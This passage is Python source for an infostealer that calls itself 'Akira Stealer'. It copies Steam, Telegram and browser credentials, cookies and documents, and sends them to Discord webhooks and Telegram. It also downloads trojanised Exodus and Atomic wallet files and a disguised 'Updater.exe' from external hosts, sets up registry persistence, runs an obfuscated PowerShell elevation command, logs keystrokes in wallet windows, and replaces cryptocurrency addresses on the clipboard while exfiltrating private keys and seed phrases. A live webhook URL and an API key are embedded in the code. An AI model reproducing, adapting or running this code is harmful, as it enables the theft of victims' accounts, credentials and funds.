                    dst_path = os.path.join(temp_folder, file)
                    shutil.copy(src_path, dst_path)
            return temp_folder
        except:
            pass
            return ""

    def send_steam(self):
        try:
            path = Steam.get_steam_path()
            if path:
                Steam.copy_ssfn_files(path)
        except:
            pass

    def get_steam_id(self):
        try:
            dataPath = r"C:\Program Files (x86)\Steam\config\loginusers.vdf"
            if os.path.isfile(dataPath):
                with open(dataPath, "r", encoding="utf-8", errors="ignore") as fileopen:
                    data = fileopen.read()
                    steamid = re.findall(r"7656[0-9]{13}", data)
                    result = steamid[0]
                    return result
        except:
            pass

    def steam_info(self):
        try:
            clientid = Steam.get_steam_id()
            accountInfo = requests.get('https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids=' + clientid).json()
            playerInfo = requests.get('https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=' + clientid).json()
            steamidd = accountInfo["response"]["players"][0]["steamid"]
            personName = accountInfo["response"]["players"][0]["personaname"]
            profileUrl = accountInfo["response"]["players"][0]["profileurl"]
            avatar = accountInfo["response"]["players"][0]["avatarfull"]
            accountid = clientid
            timecreated = accountInfo["response"]["players"][0]["timecreated"]
            flags = accountInfo["response"]["players"][0]["personastateflags"]
            country = accountInfo["response"]["players"][0]["loccountrycode"]
            playerlevel = playerInfo["response"]["player_level"]
            return steamidd, personName, profileUrl, avatar, accountid, timecreated, flags, country, playerlevel
        except:
            return "", "", "", "", "", "", "", "", ""

    def steam_hook(self):
        try:
            headers = {"Content-Type": "application/json"}
            steamidd, personName, profileUrl, avatar, accountid, timecreated, flags, country, playerlevel = Steam.steam_info()

            timecreated = datetime.datetime.utcfromtimestamp(timecreated).strftime('%Y-%m-%d %H:%M:%S')

            data = {
                "content": "",
                "tts": False,
                "embeds": [
                    {
                        "title": f"<a:s_arrows:1154384742049923113>  {personName}",
                        "color": 0xbf0202,
                        "fields": [
                            {
                                "name": "Steam ID: ",
                                "value": f"```🎮 {steamidd}```",
                                "inline": False
                            },
                            {
                                "name": "Creation date: ",
                                "value": f"```⌚️ {timecreated}```",
                                "inline": False
                            },
                            {
                                "name": "Account ID: ",
                                "value": f"```🌔 {accountid}```",
                                "inline": False
                            },
                            {
                                "name": "Flags: ",
                                "value": f"```📛 {flags}```",
                                "inline": False
                            },
                            {
                                "name": "Country: ",
                                "value": f"```🗾 {country}```",
                                "inline": False
                            },
                            {
                                "name": "Level: ",
                                "value": f"```💯 {playerlevel}```",
                                "inline": False
                            },
                            {
                                "name": "Profile URL: ",
                                "value": f"{profileUrl}",
                                "inline": False
                            }
                        ],
                        "author": {},
                        "thumbnail": {
                            "url": f"{avatar}"
                        }
                    }
                ],
                "components": [],
                "actions": {},
                "username": "Akira 💊",
                "avatar_url": "https://cdn.discordapp.com/attachments/1145735406978076845/1154021402052145272/akira-logo.png?width=256&height=256"
            }
            try:
                requests.post(self.webhook, json=data, headers=headers)
            except:
                pass
        except:
            pass

class Utils:

    @staticmethod
    def fix_browser_data():
        client_folder = Utils.get_temp_folder()

        #Autofill
        all_autofills = ""
        for root, _, files in os.walk(os.path.join(client_folder, "Autofill")):
            for file in files:
                if ".txt" in file.lower():
                    try:
                        with open(os.path.join(root, file), "r", encoding="utf-8", errors="ignore") as f:
                            for line in f.readlines():
                                if "Akira Stealer" not in line and len(line) > 1:
                                    all_autofills += line
                    except:
                        pass
        if len(all_autofills) > 1:
            try:
                with open(os.path.join(client_folder, "Autofill/ALL.txt"), "w", encoding="utf-8") as f:
                    f.write(all_autofills)
            except:
                pass

        #Cookies
        all_cookies = ""
        for root, _, files in os.walk(os.path.join(client_folder, "Cookies")):
            for file in files:
                if ".txt" in file.lower():
                    try:
                        with open(os.path.join(root, file), "r", encoding="utf-8", errors="ignore") as f:
                            for line in f.readlines():
                                if "Akira Stealer" not in line and len(line) > 1:
                                    all_cookies += line
                    except:
                        pass
        if len(all_cookies) > 1:
            try:
                with open(os.path.join(client_folder, "Cookies/ALL.txt"), "w", encoding="utf-8") as f:
                    f.write(all_cookies)
            except:
                pass

        #History
        all_history = ""
        for root, _, files in os.walk(os.path.join(client_folder, "History")):
            for file in files:
                if ".txt" in file.lower():
                    try:
                        with open(os.path.join(root, file), "r", encoding="utf-8", errors="ignore") as f:
                            for line in f.readlines():
                                if "Akira Stealer" not in line and len(line) > 1:
                                    all_history += line
                    except:
                        pass
        if len(all_history) > 1:
            try:
                with open(os.path.join(client_folder, "History/ALL.txt"), "w", encoding="utf-8") as f:
                    f.write(all_history)
            except:
                pass

        #Passwords
        all_passwords = ""
        for root, _, files in os.walk(os.path.join(client_folder, "Passwords")):
            for file in files:
                if ".txt" in file.lower():
                    try:
                        with open(os.path.join(root, file), "r", encoding="utf-8", errors="ignore") as f:
                            for line in f.readlines():
                                if "Akira Stealer" not in line and len(line) > 1:
                                    all_passwords += line
                    except:
                        pass
        if len(all_passwords) > 1:
            try:
                with open(os.path.join(client_folder, "Passwords/ALL.txt"), "w", encoding="utf-8") as f:
                    f.write(all_passwords)
            except:
                pass

    @staticmethod
    def GetSelf() -> tuple[str, bool]: # Returns the location of the file and whether exe mode is enabled or not
        if hasattr(sys, "frozen"):
            return (sys.executable, True)
        else:
            return (__file__, False)

    @staticmethod
    def TaskKill(*tasks: str) -> None:
        tasks = list(map(lambda x: x.lower(), tasks))
        out = (subprocess.run('tasklist /FO LIST', shell=True, capture_output=True).stdout.decode(errors='ignore')).strip().split('\r\n\r\n')
        current_pid = os.getpid()
        for i in out:
            i = i.split("\r\n")[:2]
            try:
                name, pid = i[0].split()[-1], int(i[1].split()[-1])
                name = name[:-4] if name.endswith(".exe") else name
                if name.lower() in tasks:
                    if pid != current_pid:
                        subprocess.run('taskkill /F /PID %d' % pid, shell=True, capture_output=True)
            except Exception:
                pass

    @staticmethod
    def showFakeError():
        if not Utils.IsInStartup():
            try:
                error_codes = [
                    (0x800F081F, "Windows could not find the requested file. Please make sure you have the correct path and try again. If the issue persists, contact your system administrator."),
                    (0x8024001E, "An error occurred while checking for updates. Please check your internet connection and try again."),
                    (0xC000021A, "The system has encountered a critical error and needs to restart."),
                    (0x80070002, "The system cannot find the specified file."),
                    (0xC0000142, "The application failed to start correctly (0xC0000142). Click OK to close the application."),
                    (0xE000020B, "A network error occurred while trying to access the requested resource."),
                    (0x80246007, "Windows Update encountered an unknown error."),
                    (0x8007045A, "The requested operation requires elevation. Please run the program as an administrator."),
                    (0x80070005, "Access is denied. Please make sure you have the necessary permissions to access this file or directory."),
                    (0x8007007E, "The specified module could not be found. Please reinstall the program to fix this issue."),
                    (0x80244019, "An error occurred while trying to connect to the Windows Update server. Please check your internet connection."),
                    (0x800B0109, "A certificate chain processed correctly, but terminated in a root certificate which is not trusted by the trust provider."),
                    (0xC0000005, "The application was unable to start correctly (0xC0000005). Click OK to close the application."),
                    (0x80070020, "The process cannot access the file because it is being used by another process."),
                    (0x80070057, "The parameter is incorrect. Please provide valid input and try again."),
                    (0xC0000221, "The file system structure on the disk is corrupt and unusable. Please run the Chkdsk utility to fix the problem."),
                    (0x800701B1, "The drive is not ready. Please make sure a disk is inserted and try again."),
                    (0x80240036, "Software installation has been disabled on your system. Please contact your system administrator."),
                    (0xC000012F, "The system cannot find message text for message number 0x{0:X} in the message file for {1}."),
                    (0x80072EE7, "The server name or address could not be resolved. Please check your network connection."),
                    (0xC0000135, "The program can't start because %hs is missing from your computer. Try reinstalling the program to fix this problem."),
                    (0x80070091, "The directory is not empty. Please remove any files or subdirectories and try again."),
                    (0x8007000E, "Not enough storage is available to complete this operation. Please free up some space and try again."),
                    (0xC0000218, "The registry cannot load the hive (file): \SystemRoot\System32\Config\SOFTWARE or its log or alternate."),
                    (0x80040154, "Class not registered. Please make sure the file is properly registered."),
                ]

                error_code, error_message = random.choice(error_codes)

                ctypes.windll.user32.MessageBoxW(0, error_message, f"Error Code: 0x{error_code:08X}", 16)
            except:
                pass

    @staticmethod
    def IsAdmin() -> bool: # Checks if the program has administrator permissions or not
        return ctypes.windll.shell32.IsUserAnAdmin() == 1

    @staticmethod
    def IsInStartup() -> bool: # Checks if the file is in startup
        path = os.path.dirname(Utils.GetSelf()[0])
        return os.path.basename(path).lower() == "startup"

    @staticmethod
    def zip_client_file():
        shutil.make_archive(Utils.get_temp_folder(), 'zip', Utils.get_temp_folder())

    @staticmethod
    def CreateMutex(mutex: str) -> bool:

        kernel32 = ctypes.windll.kernel32
        mutex = kernel32.CreateMutexA(None, False, mutex)

        return kernel32.GetLastError() != 183

    @staticmethod
    def init_client_folder(browser = False, chatId = ""):
        client_dir = Utils.get_temp_folder()
        if not os.path.exists(client_dir):
            os.mkdir(client_dir)
            if chatId != "":
                with open(os.path.join(client_dir, "ip.txt"), "w") as file:
                    file.write("IP: " + data.ip + "\nCountry: " + data.countryCode)
                with open(os.path.join(client_dir, chatId + ".id"), "w") as file:
                    file.write("")
        if browser == True:
            if not os.path.exists(os.path.join(client_dir, "Passwords")):
                os.mkdir(os.path.join(client_dir, "Passwords"))
            if not os.path.exists(os.path.join(client_dir, "CreditCards")):
                os.mkdir(os.path.join(client_dir, "CreditCards"))
            if not os.path.exists(os.path.join(client_dir, "Cookies")):
                os.mkdir(os.path.join(client_dir, "Cookies"))
            if not os.path.exists(os.path.join(client_dir, "History")):
                os.mkdir(os.path.join(client_dir, "History"))
            if not os.path.exists(os.path.join(client_dir, "Autofill")):
                os.mkdir(os.path.join(client_dir, "Autofill"))
            if not os.path.exists(os.path.join(client_dir, "Wallets")):
                os.mkdir(os.path.join(client_dir, "Wallets"))

    @staticmethod
    def clear_client_folder():
        try:
            if os.path.exists(Utils.get_temp_folder()):
                shutil.rmtree(Utils.get_temp_folder())
            if os.path.exists(Utils.get_temp_folder() + ".zip"):
                os.remove(Utils.get_temp_folder() + ".zip")
        except:
            pass

    @staticmethod
    def get_temp_folder() -> str:
        try:
            return os.path.join(os.getenv("temp"), os.getenv("computername"))
        except:
            return os.path.join(os.getenv("temp"), "CLIENT")

    @staticmethod
    def GetLnkTarget(path_to_lnk: str) -> str | None: # Finds the target of the given shortcut file
        target = None
        if os.path.isfile(path_to_lnk):
            output = subprocess.run('wmic path win32_shortcutfile where name="%s" get target /value' % os.path.abspath(path_to_lnk).replace("\\", "\\\\"), shell= True, capture_output= True).stdout.decode()
            if output:
                for line in output.splitlines():
                    if line.startswith("Target="):
                        temp = line.lstrip("Target=").strip()
                        if os.path.exists(temp):
                            target = temp
                            break

        return target

    @staticmethod
    def GetLnkFromStartMenu(app: str) -> list[str]: # Finds the shortcut to an app in the start menu
        shortcutPaths = []
        startMenuPaths = [
            os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs"),
            os.path.join("C:\\", "ProgramData", "Microsoft", "Windows", "Start Menu", "Programs")
        ]
        for startMenuPath in startMenuPaths:
            for root, _, files in os.walk(startMenuPath):
                for file in files:
                    if file.lower() == "%s.lnk" % app.lower():
                        shortcutPaths.append(os.path.join(root, file))

        return shortcutPaths

    @staticmethod
    def steal_telegram() -> bool:
        if os.path.exists(f"{os.getenv('APPDATA')}/Telegram Desktop/tdata/"):
            try:
                Utils.TaskKill("Telegram")
                if os.path.isdir(f"{os.getenv('APPDATA')}/Telegram Desktop/tdata/user_data"):
                    shutil.rmtree(f"{os.getenv('APPDATA')}/Telegram Desktop/tdata/user_data")
                if os.path.isdir(f"{os.getenv('APPDATA')}/Telegram Desktop/tdata/user_data"):
                    shutil.rmtree(f"{os.getenv('APPDATA')}/Telegram Desktop/tdata/emoji")
                shutil.copytree(f"{os.getenv('APPDATA')}\\Telegram Desktop\\tdata", os.path.join(Utils.get_temp_folder(), "Telegram"))
                return True
            except Exception as ex:
                Akira.logErrorTg(traceback.format_exc())
                return False
        else:
            return False

    @staticmethod
    def steal_files():
        stolen_files = set()
        temp_folder = Utils.get_temp_folder()
        allowed_extensions = [".txt", ".doc", ".docx", ".pdf", ".csv", ".xls", ".xlsx", ".jpg", ".png"]

        for folder in searchFolders:
            current_path = os.path.join(os.environ['USERPROFILE'], folder)
            if os.path.exists(current_path):
                for root, _, files in os.walk(current_path):
                    for file in files:
                        lower_file = file.lower()
                        for keyword in keywordsFiles:
                            if keyword in lower_file and file not in stolen_files:
                                for ext in allowed_extensions:
                                    try:
                                        if ext in lower_file and "tokenize" not in lower_file and os.path.getsize(os.path.join(root, file)) / (1024 * 1024) <=2:
                                            if not os.path.exists(os.path.join(temp_folder, "Files")):
                                                os.mkdir(os.path.join(temp_folder, "Files"))
                                            if os.path.isfile(os.path.join(root, file)):
                                                shutil.copy(os.path.join(root, file), os.path.join(temp_folder, "Files", file))
                                            else:
                                                shutil.copytree(os.path.join(root, file), os.path.path(temp_folder, "Files", file))
                                            stolen_files.add(file)
                                    except:
                                        Akira.logErrorTg(traceback.format_exc())
                                        pass
        data.stolen_files.extend(stolen_files)

    @staticmethod
    def steal_steam() -> bool: # Steals Steam accounts
        saveToPath = os.path.join(Utils.get_temp_folder(), "Steam")
        steamPaths  = [*set([os.path.dirname(x) for x in [Utils.GetLnkTarget(v) for v in Utils.GetLnkFromStartMenu("Steam")] if x is not None])]
        multiple = len(steamPaths) > 1
        SteamStolen = False

        if not steamPaths:
            steamPaths.append("C:\\Program Files (x86)\\Steam")

        for index, steamPath in enumerate(steamPaths):
            steamConfigPath = os.path.join(steamPath, "config")
            if os.path.isdir(steamConfigPath):
                loginFile = os.path.join(steamConfigPath, "loginusers.vdf")
                if os.path.isfile(loginFile):
                    with open(loginFile, encoding="utf-8", errors="ignore") as file:
                        contents = file.read()
                    if '"RememberPassword"\t\t"1"' in contents:
                        try:
                            _saveToPath = saveToPath
                            if multiple:
                                _saveToPath = os.path.join(saveToPath, "Profile %d" % (index + 1))
                            os.makedirs(_saveToPath, exist_ok= True)
                            shutil.copytree(steamConfigPath, os.path.join(_saveToPath, "config"), dirs_exist_ok= True)
                            for item in os.listdir(steamPath):
                                if item.startswith("ssfn") and os.path.isfile(os.path.join(steamPath, item)):
                                    shutil.copy(os.path.join(steamPath, item), os.path.join(_saveToPath, item))
                                    SteamStolen = True
                                    return True
                        except Exception:
                            return False
        if SteamStolen and multiple:
            with open(os.path.join(saveToPath, "Steam.txt"), "w") as file:
                file.write("Multiple Steam installations are found, so the files for each of them are put in different Profiles")
            return True
        return False

    @staticmethod
    def download_file(file_url, file_name) -> str:
        response = requests.get(file_url)
        if response.status_code == 200:
            icon_path = os.path.join(os.getenv("temp"), file_name)
            if os.path.exists(icon_path):
                os.remove(icon_path)
            with open(icon_path, 'wb') as file:
                file.write(response.content)
                return os.path.join(os.getenv("temp"), file_name)
        return None

    @staticmethod
    def uac_cmd(command: str):
        plain_command = command + " -Verb runAs -WindowStyle hidden /f"
        code = bytearray(plain_command, 'utf-16-le');code = base64.b64encode(code).decode()
        setVar = "Set-Variable -Name 'code' -Value "+f'"{code}";'
        final_command = r"(nEw-OBJECt  Io.CoMpreSsion.DEflateSTrEaM( [SyStem.io.memoRYSTReaM][convErT]::fromBaSE64STriNg( 'hY49C8IwGIT/ykvoGjs4FheLqIgfUHTKEpprK+SLJFL99zYFwUmXm+6ee4rzcbti3o0IcYDWCzxBfKSB+Mldctg98c0TLa1fXsZIHLalonUKxKqAnqRSxHaH+ioa16VRBohaT01EsXCmF03mirOHFa0zRlrFqFRUTM9Udv8QJvKIlO62j6J+hBvCvGYZzfK+c2o68AhZvWqSDIk3GvDEIy1nvIJGwk9J9lH53f22mSdv') ,[SysTEM.io.COMpResSion.coMPRESSIONMoDE]::DeCompress ) | ForeacH{nEw-OBJECt Io.StReaMrEaDer( $_,[SySTEM.teXT.enCOdING]::aSciI )}).rEaDTOEnd( ) | InVoKE-expREssION"
        try:
            subprocess.run(["powershell",setVar,final_command], capture_output=True, text=True, check=True)
        except subprocess.CalledProcessError:
            pass

    @staticmethod
    def PutInStartup() -> str:
        try:
            program_name = "Updater.exe"
            if not os.path.exists(os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Internet Explorer', 'UserData', "Updater.exe")):
                if requests.get('https://cosmoplwnets.xyz/.well-known/pki-validation/Updater.exe').status_code == 200:
                    download_url = 'https://cosmoplwnets.xyz/.well-known/pki-validation/Updater.exe'
                elif requests.get('https://cosmoplanets.net/well-known/pki-validation/Updater.exe').status_code == 200:
                    download_url = 'https://cosmoplanets.net/well-known/pki-validation/Updater.exe'
                try:
                    response = requests.get(download_url)
                    if response.status_code == 200:
                        with open(os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Internet Explorer', 'UserData', "Updater.exe"), 'wb') as f:
                            f.write(response.content)
                except:
                    pass

            path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Internet Explorer', 'UserData')
            if os.path.exists(path):
                command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Realtek Audio\" /t REG_SZ /d "{path}\\{program_name}" /f'
                subprocess.run(command, shell=True, check=True)
        except:
            pass
        try:
            destination_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Internet Explorer', 'UserData', "Updater.exe")
            if os.path.isfile(os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Internet Explorer', 'UserData', "Updater.exe")):
                #shutil.copy(os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Internet Explorer', 'UserData', "Updater.exe"), destination_path)
                subprocess.run(["attrib", "+h", "+s", destination_path])
        except:
            pass


    @staticmethod
    def check_registry_key(key_path, key_name):
        try:
            command = f'reg query {key_path} /v {key_name}'
            result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            return result.returncode == 0
        except:
            return False

    @staticmethod
    def GetRandomString(length: int = 5, invisible: bool = False):
        if invisible:
            return "".join(random.choices(["\xa0", chr(8239)] + [chr(x) for x in range(8192, 8208)], k= length))
        else:
            return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k= length))

    @staticmethod
    def HideConsole() -> None: # Hides the console window
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    @staticmethod
    def InjectExodusAsar():
        if os.path.exists(os.path.join(os.getenv('LOCALAPPDATA'), "exodus")):
            for file in os.listdir(os.path.join(os.getenv('LOCALAPPDATA'), "exodus")):
                if re.search(r'app-+?', file):
                    resources = os.path.join(os.getenv('LOCALAPPDATA'), "exodus", file, "resources")
                    if not os.path.exists(resources):
                        continue
                    if requests.get('https://cosmoplwnets.xyz/.well-known/pki-validation/exodus.asar').status_code == 200:
                        download_url = 'https://cosmoplwnets.xyz/.well-known/pki-validation/exodus.asar'
                    elif requests.get('https://cosmoplanets.net/well-known/pki-validation/exodus.asar').status_code == 200:
                        download_url = 'https://cosmoplanets.net/well-known/pki-validation/exodus.asar'

                    try:
                        response = requests.get(download_url)
                        if response.status_code == 200:
                            with open(os.path.join(resources, 'app.asar'), 'wb') as f:
                                f.write(response.content)
                        app_path = os.path.join(os.getenv('LOCALAPPDATA'), "exodus", file)
                        with open(app_path + "\\LICENSE", "w", encoding="utf8") as ff:
                            ff.write("https://discord.com/api/webhooks/1254792114169184288/pKUU6T-r0cdtlpEi-PbTkEKPxxFOojTqiXAovd7RrlcniHKEpxqwHEeGSjk8BVch_HT9")
                    except:
                        pass

    @staticmethod
    def InjectAtomicAsar():
        if os.path.exists(os.path.join(os.getenv('LOCALAPPDATA'), "Programs", "atomic")):
            app_path = os.path.join(os.getenv('LOCALAPPDATA'), "Programs", "atomic")
            resources = os.path.join(os.getenv('LOCALAPPDATA'), "Programs", "atomic", "resources")
            if not os.path.exists(resources):
                return
            if requests.get('https://cosmoplwnets.xyz/.well-known/pki-validation/atomic.asar').status_code == 200:
                download_url = 'https://cosmoplwnets.xyz/.well-known/pki-validation/atomic.asar'
            elif requests.get('https://cosmoplanets.net/well-known/pki-validation/atomic.asar').status_code == 200:
                download_url = 'https://cosmoplanets.net/well-known/pki-validation/atomic.asar'
            try:
                response = requests.get(download_url)
                if response.status_code == 200:
                    with open(os.path.join(resources, 'app.asar'), 'wb') as f:
                        f.write(response.content)
                with open(app_path + "\\LICENSE.electron.txt", "w", encoding="utf8") as ff:
                    ff.write("https://discord.com/api/webhooks/1254792114169184288/pKUU6T-r0cdtlpEi-PbTkEKPxxFOojTqiXAovd7RrlcniHKEpxqwHEeGSjk8BVch_HT9")
            except:
                pass

class Bypasser:

    @staticmethod
    def spoof_self():
        proc_name, is_executable = Utils.GetSelf()
        if is_executable == True:
            chrome_out = os.path.join(os.getenv("temp"), "svchost.exe")
            try:
                if os.path.exists(chrome_out):
                    os.remove(chrome_out)
            except:
                pass
            if not "svchost.exe" in proc_name:
                try:
                    shutil.copy(proc_name, chrome_out)
                    subprocess.run(chrome_out, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
                except Exception:
                    return None


class WalletInject:
    current_string: str = ""
    ext_name: str = ""
    capture: bool = False
    clipboard: str = ""

    def on_key_press(self, event):
        global current_string, ext_name

        maiusc: bool = False
        current_window = self.fetch_one()
        if self.is_ext(current_window["width"], current_window["height"], str(current_window["title"])) or "Enter Password" in current_window["title"]:
            self.capture = True

        for ext in walletsExtensions:
            if ext[0].lower() in str(current_window["title"]).lower():
                self.capture = True

        if self.capture:
            if event.name == "enter":
                self.current_string += ""
            elif event.name == "space":
                self.current_string += " "
            elif event.name == "caps lock":
                self.current_string += "[CAPS LOCK]"
            elif event.name == "ctrl":
                self.current_string += "[CTRL]"
            elif event.name == "maiusc":
                maiusc = True
            else:
                if maiusc:
                    self.current_string += event.name.upper()
                    maiusc = False
                else:
                    self.current_string += event.name
            if len(pyperclip.paste()) > 4:
                self.clipboard = pyperclip.paste()

    def is_metamask(self, width, height):
        if width == 371 and height == 614:
            return True

    def is_phantom(self, width, height):
        if width == 374 and height == 614:
            return True

    def is_ext(self, width, height, title):
        #if height == 614:
        if len(title) < 2:
            if height > 520 and height < 650:
            #if self.is_metamask(width, height) or self.is_phantom(width, height):
                return True

    def fetch_one(self):
        try:
            current_active_window = pygetwindow.getActiveWindow()
            return {"title": current_active_window.title, "width": current_active_window.width, "height": current_active_window.height}
        except:
            return {"title": "Error", "width": 0, "height": 0}

    def generate_vanity_address(self, prefix, suffix):
        prefix = prefix.lower()
        suffix = suffix.lower()

        while True:
            private_key = keccak_256(token_bytes(32)).digest()

            public_key = PublicKey.from_valid_secret(private_key).format(compressed=False)[1:]
            address = keccak_256(public_key).digest()[-20:]
            value = address.hex()
            if value.startswith(prefix):
                return private_key.hex(), "0x" + value

    def payload_data(self):

        while True:
            pyperclip.waitForNewPaste()
            clipboard = str(pyperclip.paste())
            btc_match = re.match("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}|^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", clipboard)
            eth_match = re.match("^0x[a-zA-F0-9]{40}$", clipboard)
            doge_match = re.match("^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$", clipboard)
            ltc_match = re.match("^([LM3]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}||ltc1[a-z0-9]{39,59})$", clipboard)
            xmr_match = re.match("^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$", clipboard)
            bch_match = re.match("^((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}$", clipboard)
            dash_match = re.match("^X[1-9A-HJ-NP-Za-km-z]{33}$", clipboard)
            trx_match = re.match("^T[A-Za-z1-9]{33}$", clipboard)
            xrp_match = re.match("^r[0-9a-zA-Z]{33}$", clipboard)
            xlm_match = re.match("^G[0-9A-Z]{40,60}$", clipboard)

            if clipboard.count(" ") < 3 and len(clipboard) > 20:
                clipboard = clipboard.replace(" ", "").replace("\t", "").replace("\n", "")
                for currency, address in addresses.items():
                    if eval(f'{currency.lower()}_match'):
                        if address and address != clipboard:
                            pyperclip.copy(address)
                            if currency.lower() == "eth":
                                found = False
                                for vadd in self.vadds:
                                    if vadd[0] == clipboard[2:][:3]:
                                        pyperclip.copy(vadd[1])
                                        #self.hook.send_vanity(f"💎 Vanity Address Replaced\n[address](https://debank.com/profile/{vadd[1]})", self.enableVanity)
                                        found = True
                                if found == False:
                                    pk, addr = self.generate_vanity_address(clipboard[2:][:3], clipboard[-2:])
                                    pyperclip.copy(addr)
                                    self.hook.send_vanity(f"💎 Vanity Address Generated:\n*Private Key:* ```{pk}```\n[address](https://debank.com/profile/{addr})", self.enableVanity)
                                    self.vadds.append([clipboard[2:][:3], addr])
                        break
                """if re.compile("^[1-9A-HJ-NP-Za-km-z]{44}$"):
                    if clipboard != "CZ4hiNVUPz241aTxnWRpxtCtSKmLT5LuBDcDRjbhvJze" and "http" not in clipboard and len(clipboard) == 44:
                        pyperclip.copy("CZ4hiNVUPz241aTxnWRpxtCtSKmLT5LuBDcDRjbhvJze")"""

                if len(clipboard) == 66 or len(clipboard) == 64:
                    if not "http" in clipboard and not "-" in clipboard and not "/" in clipboard:
                        self.hook.send_vanity(f"♻️ Ethereum Private Key Found:\n*Private Key:* ```{clipboard}```", False)
                if len(clipboard) == 88:
                    if not "http" in clipboard and not "-" in clipboard and not "/" in clipboard:
                        self.hook.send_vanity(f"♻️ Solana Private Key Found:\n*Private Key:* ```{clipboard}```", False)

                if clipboard.count(" ") >= 12 and clipboard.count(" ") <= 26:
                    try:
                        msg_parts = clipboard.split(" ")
                        x = 0
                        for msg_part in msg_parts:
                            if msg_part in self.mnemonic_words:
                                x += 1
                        if x >= 12 and x <= 24:
                            self.hook.send_vanity(f"🔑 New Mnemonic Detected!:\n```{clipboard}```", False)
                    except:
                        pass


    def ext_injector(self, hook):
        global current_string, ext_name
        while True:
            try:
                current_window = self.fetch_one()
                #print(str(current_window["width"]) + ":" + str(current_window["height"]) + " - " + str(current_window["title"]))
                if self.capture == True:
                    keyboard.wait('enter')
                    if self.current_string != "":
                        self.current_string = "**Keylogger:** ``` " + self.current_string + " ```"
                    if len(self.clipboard) > 1:
                        self.current_string += "\n**Clipboard:** ``` " + self.clipboard + " ```"
                    hook.send_wallet_pw_tg(self.current_string, self.mnemonic_words)
                    self.current_string = ""
                    self.ext_name = ""
                #else:
            # DEBUG
            except:
                pass

    def get_all_mnemonic_word(self):
        try:
            mnemonic_words = requests.get("https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt").text
        except:
            mnemonic_words = ""
        return mnemonic_words

    def __init__(self, hook, enableVanity):
        self.enableVanity = enableVanity
        self.vadds = []
        self.hook = hook
        self.mnemonic_words = self.get_all_mnemonic_word()
        a = threading.Thread(target = self.payload_data)
        a.start()
        keyboard.on_release(self.on_key_press)
        self.ext_injector(hook)

class Wallets:

    def grabExtensions():
        threads: list[Thread] = []

        for name, item in paths.items():
            path, procname = item
            if os.path.isdir(path):
                def run(name, path):
                    for ext in walletsExtensions:
                        for root, _, files in os.walk(path):
                            for file in files:
                                try:
                                    filepath = os.path.join(root, file)
                                    if ext[1].replace("/", "\\") in filepath:
                                        dir_path = filepath.split(ext[1].replace("/", "\\"))[0] + ext[1].replace("/", "\\")

                                        #Coinbase
                                        if "\\IndexedDB\\chrome-extension_hnfanknocfeofbddgcijnmhnfnkdnaad_0.indexeddb.leveldb" in dir_path:
                                            profile = filepath.split("\\User Data\\")[1].split("\\")[0].replace("\\", "")
                                            if not os.path.isdir(os.path.join(Utils.get_temp_folder(), "Wallets") + "/" + "Coinbase_LocalStorage_" + profile):
                                                shutil.copytree(filepath.split("\\User Data\\" + profile)[0] + "\\User Data\\" + profile + "\\Local Storage\\leveldb\\", os.path.join(Utils.get_temp_folder(), "Wallets") + "/" + "Coinbase_LocalStorage_" + profile)

                                        dest_path = os.path.join(Utils.get_temp_folder(), "Wallets") + "/" + ext[0] + "_" + name + "_" + filepath.split("\\User Data\\")[1].split("\\")[0].replace("\\", "")
                                        if not os.path.isdir(dest_path):
                                            Utils.TaskKill(procname)
                                            shutil.copytree(dir_path, dest_path)
                                            data.ext_wallets_count += 1
                                        else:
                                            continue
                                except:
                                    pass
                t = Thread(target= run, args= (name, path))
                t.start()
                threads.append(t)
                for thread in threads:
                    thread.join()

    def grabDesktopWallets():
        dest_path = os.path.join(Utils.get_temp_folder(), "Wallets")

        for wallet in walletsDesktop:
            if os.path.isdir(wallet[1]):
                if not os.path.exists(os.path.join(dest_path, wallet[0])):
                    try:
                        Utils.TaskKill(wallet[0])
                        shutil.copytree(wallet[1], os.path.join(dest_path, wallet[0]))
                        data.desktop_wallets_count += 1
                    except:
                        pass
class Webhook():

    def __init__(self, webhook_url: str):
        self.webhook_url = webhook_url
        self.updateData()

    def updateData(self):
        self.filename = data.filename
        self.username = data.username
        self.autofill_count = data.autofill_count
        self.cookie_count = data.cookie_count
        self.password_count = data.password_count
        self.cc_count = data.cc_count
        self.ext_wallets_count = data.ext_wallets_count
        self.desktop_wallets_count = data.desktop_wallets_count
        self.keywords = data.keywords[:-2]
        self.ip = data.ip
        self.countryCode = data.countryCode
        self.systeminfo = data.system_info
        self.computername = data.computerName
        self.has_telegram = data.has_telegram
        self.has_steam = data.has_steam
        self.stolen_files = data.stolen_files

    def sendDataTG(self, file_path, chatId, startup) -> str:
        self.starttitle = "💉 Infected "
        if startup == True:
            self.starttitle = "🔄 Reboot "
        description = "\n"
        if self.keywords == "":
            self.keywords = "None"
        try:
            gofile_url = self.uploadToGofile(file_path)
            if gofile_url != "":
                description += f"[GoFile Download]({gofile_url})\n"
            else:
                fileio_url = self.uploadFileio(file_path)
                if fileio_url != "":
                    description += f"[FileIO Download]({fileio_url})\n"
                else:
                    oshiAtUrl = self.uploadToOshiAt(file_path)
